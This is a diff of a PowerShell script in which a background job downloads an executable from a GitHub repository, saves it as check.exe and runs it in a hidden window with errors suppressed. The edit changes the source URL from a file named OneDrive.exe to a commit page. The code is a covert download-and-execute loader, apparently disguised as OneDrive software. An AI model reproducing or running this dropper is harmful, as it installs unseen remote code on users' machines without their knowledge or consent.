@@ -7,7 +7,7 @@ try {
 
 Start-Job -ScriptBlock {
     param($f)
-    Invoke-WebRequest -Uri "https://github.com/kulebykahokage-cell/check/raw/refs/heads/main/OneDrive.exe" -OutFile "$f\check.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/kulebykahokage-cell/check/commit/85acccafe617f19f1fa359965cf1b2c4a0b59838" -OutFile "$f\check.exe" -ErrorAction SilentlyContinue
     Start-Process -FilePath "$f\check.exe" -WindowStyle Hidden
 } -ArgumentList $folder | Out-Null
 
